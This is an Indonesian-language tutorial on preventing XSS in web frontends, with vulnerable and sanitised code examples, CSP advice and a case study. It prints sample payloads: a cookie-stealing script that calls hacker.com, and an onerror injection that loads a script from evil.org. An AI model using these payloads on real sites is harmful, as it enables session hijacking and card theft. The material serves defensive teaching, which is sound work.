# XSS (Cross-Site Scripting)

## 1. Skenario Sistem Nyata

Sebuah aplikasi media sosial memiliki fitur komentar postingan. Seorang pengguna menuliskan komentar berisi teks berikut:
`<script>fetch('https://hacker.com/steal?c=' + document.cookie)</script>`

Aplikasi merender komentar tersebut ke layar pengguna lain menggunakan properti `innerHTML` tanpa proses sanitasi atau filtering:
`element.innerHTML = comment.text;`

Ketika ratusan pengguna lain membuka postingan tersebut, browser mereka mengeksekusi skrip tersebut secara otomatis seolah-olah itu adalah kode resmi dari pengembang aplikasi. Session token pengguna terkirim ke server penyerang, profil korban difollow-kan ke akun spam, dan banner phishing palsu muncul di layar korban.

Insiden ini adalah contoh klasik dari serangan **Stored XSS (Cross-Site Scripting)**.

## 2. Apa Itu dan Buat Apa?

XSS (Cross-Site Scripting) adalah kerentanan keamanan web di mana penyerang berhasil menyuntikkan (*inject*) skrip berbahaya (biasanya JavaScript) ke dalam halaman web yang dilihat oleh pengguna lain.

XSS terjadi karena aplikasi memperlakukan data input yang tidak terpercaya (*untrusted user input*) sebagai instruksi kode yang dapat dieksekusi di browser, alih-alih memperlakukannya sebagai teks statis.

Memahami dan mencegah XSS bertujuan melindungi kerahasiaan data pengguna, integritas sesi login, dan reputasi aplikasi dari pembajakan antarmuka (*UI defacement*).

## 3. Kenapa Harus Pakai Ini? (Urgensi Pencegahan XSS)

Memahami dan menerapkan pertahanan terhadap XSS adalah kewajiban mutlak bagi setiap frontend developer karena:
- **Dampak Fatal Pembajakan Akun**: Skrip jahat yang lolos berjalan dengan hak istimewa pengguna korban, mampu membaca token di memori atau melakukan transaksi atas nama user.
- **Tiga Vektor Serangan Utama yang Wajib Dipahami**:
  1. **Stored XSS (Persistent)**: Skrip jahat tersimpan di database (kolom komentar, bio profil). Setiap kali pengguna lain membuka halaman, skrip tereksekusi. Ini varian paling berbahaya.
  2. **Reflected XSS (Non-Persistent)**: Skrip disisipkan lewat URL query atau form parameter (`?q=<script>...`). Server langsung mencerminkan teks tersebut ke HTML tanpa sanitasi.
  3. **DOM-based XSS**: Kerentanan murni di sisi browser. JavaScript membaca dari source rentan (`location.hash`) lalu menulisnya langsung ke sink berbahaya (`innerHTML`, `eval()`).

## 4. Cara Kerjanya

Berikut adalah diagram alur eksploitasi Stored XSS vs DOM XSS:

```
--- SKENARIO STORED XSS ---
[ Penyerang ] --- 1. POST /comment { text: "<script>steal()</script>" } ---> [ Server / Database ]
                                                                                   |
[ Pengguna Korban ] <--- 2. GET /post/123 (Mengembalikan komentar mentah) ---------|
       |
       |--- 3. Browser merender via innerHTML -> Eksekusi steal()
       |--- 4. Kirim document.cookie ke Server Penyerang -------------------> [ Hacker Server ]


--- SKENARIO DOM-BASED XSS (MURNI FRONTEND) ---
[ Korban membuka link ] -> https://app.com/dashboard#<img src=x onerror=alert(1)>
          |
          v
[ Browser JavaScript Client ]
const hash = window.location.hash.substring(1); // SOURCE
document.getElementById('welcome').innerHTML = hash; // SINK BERBAHAYA!
          |
          v (Browser mengeksekusi onerror skrip jahat)
```

## 5. Cuplikan Logika Inti

### Kode Rentan vs Kode Aman (DOM Manipulation)

```typescript
// 1. CONTOH KODE RENTAN (Vulnerable Sink)
function renderBadGreeting(userName: string) {
  // JANGAN LAKUKAN INI: Memungkinkan eksekusi tag <script> atau <img onerror=...>
  document.getElementById('greeting')!.innerHTML = `Halo, ${userName}!`;
}

// 2. CONTOH KODE AMAN (Text Content & Modern Sanitization)
import DOMPurify from 'dompurify';

function renderSafeGreeting(userName: string) {
  // CARA 1: textContent memperlakukan input murni sebagai string teks (bukan HTML)
  const element = document.getElementById('greeting')!;
  element.textContent = `Halo, ${userName}!`;
}

function renderSafeRichText(userHtmlInput: string) {
  // CARA 2: Jika memang harus merender tag HTML (misal editor WYSIWYG),
  // wajib bersihkan (sanitize) menggunakan library DOMPurify
  const cleanHtml = DOMPurify.sanitize(userHtmlInput, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href', 'title'],
  });

  const contentArea = document.getElementById('rich-content')!;
  contentArea.innerHTML = cleanHtml;
}
```

### Pencegahan di Framework Modern (React JSX)

React secara default mencegah XSS dengan melakukan auto-encoding pada semua variabel di JSX:

```tsx
// frontend/src/components/UserComment.tsx
export function UserComment({ commentText }: { commentText: string }) {
  // AMAN: React otomatis meng-encode karakter < > & " menjadi entitas HTML
  return <div className="comment-body">{commentText}</div>;

  // BAHAYA: Hanya gunakan dangerouslySetInnerHTML jika sudah dibersihkan DOMPurify
  // return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(commentText) }} />;
}
```

## 6. Kelebihan dan Kekurangan (Trade-offs)

| Strategi Mitigasi | Kelebihan | Kekurangan / Risiko |
| :--- | :--- | :--- |
| **Contextual Output Encoding** | Solusi paling murah, tidak butuh dependensi luar, 100% aman untuk teks biasa | Tidak bisa digunakan jika user memang diperbolehkan memasukkan format HTML (Rich Text Editor) |
| **HTML Sanitization (DOMPurify)** | Mengizinkan fitur styling teks (bold, italic, link) dengan aman | Menambah ukuran bundle library (~15KB gzipped) dan ada sedikit latency parsing string |
| **Content Security Policy (CSP)** | Benteng pertahanan lapis kedua jika sanitasi frontend kebobolan | Membutuhkan konfigurasi HTTP header yang ketat dan disiplin arsitektur tanpa inline script |

## 7. Kapan Harus Pakai vs Kapan Jangan Pakai

### Kapan Sanitasi & Encoding Wajib Dipakai
- Menampilkan data yang bersumber dari input pengguna (nama, komentar, pesan chat, review produk).
- Menampilkan data yang bersumber dari URL parameter (`window.location.search`, `window.location.hash`).
- Membaca data dari API pihak ketiga yang integritasnya tidak bisa dijamin sepenuhnya.

### Kapan Boleh Render Mentah
- Konten HTML statis yang diketik langsung oleh tim developer di dalam repository kode sendiri (bukan input dinamis dari luar).

## 8. Metrik Kunci & Observabilitas

1. **CSP Violation Reports**: Pantau log yang dikirim browser ke endpoint `report-uri` CSP. Setiap pelanggaran eksekusi skrip inline yang diblokir browser adalah petunjuk keberadaan celah XSS aktif.
2. **DOMPurify Filtered Element Count**: Catat jumlah tag HTML berbahaya yang berhasil dicopot oleh sanitasi sebelum dirender.
3. **Vulnerability Scanner Alert (Snyk / Dependabot)**: Pantau dependensi frontend secara berkala untuk mendeteksi kerentanan XSS pada library rendering markdown atau syntax highlighter.

## 9. Studi Kasus Industri Nyata

Sebuah platform e-commerce besar memiliki fitur ulasan barang yang mengizinkan pembeli menyertakan gambar ulasan.

Alih-alih memvalidasi URL gambar, developer menyisipkan nilai input ke tag img:
`<img src="${review.imageUrl}">`

Seorang penyerang mengirimkan payload pada input `imageUrl`:
`x" onerror="var s=document.createElement('script');s.src='https://evil.org/x.js';document.body.appendChild(s);`

Ketika gambar gagal dimuat (karena URL bernilai "x"), browser mengeksekusi event handler `onerror` yang memuat skrip jahat dari luar. Skrip tersebut memasang keylogger palsu pada kolom kartu kredit halaman checkout. Ribuan nomor kartu kredit pelanggan tercuri sebelum sistem dimatikan.

Perbaikan arsitektural:
1. Validasi URL gambar di backend: Hanya izinkan protokol `https://` dengan domain CDN resmi.
2. Memasang CSP ketat: `script-src 'self'` yang memblokir pemuatan skrip dari domain tidak dikenal (`evil.org`).
3. Mengubah cara rendering menjadi elemen DOM aman: `img.setAttribute('src', encodeURI(review.imageUrl))`.

## 10. Fakta Menarik & Gotchas Production

- **Event Handler Injection**: XSS tidak selalu membutuhkan tag `<script>`. Penyerang modern sering menggunakan atribut event handler seperti `<img src=x onerror=...>`, `<svg onload=...>`, `<body onload=...>`, atau link `javascript:alert(1)`.
- **Bahaya `javascript:` Pseudo-protocol**: Menetapkan URL pada tag link `<a href={userWebsite}>` tetap bisa memicu XSS jika user memasukkan `javascript:stealToken()`. Selalu validasi bahwa protokol diawali dengan `http://` atau `https://`.
- **Framework Modern Bukan Jaminan Mutlak**: Meskipun React dan Vue otomatis melakukan escape string, developer masih bisa terjebak XSS jika menggunakan `dangerouslySetInnerHTML`, `v-html`, atau binding `href` ke URI tidak valid.

## 11. Rangkuman Singkat

XSS adalah kerentanan eksekusi skrip berbahaya di browser pengguna akibat kelalaian membedakan antara data input dan instruksi kode. Lindungi aplikasi Anda dengan menggunakan contextual output encoding, library sanitasi seperti DOMPurify untuk HTML dinamis, dan header Content Security Policy (CSP).
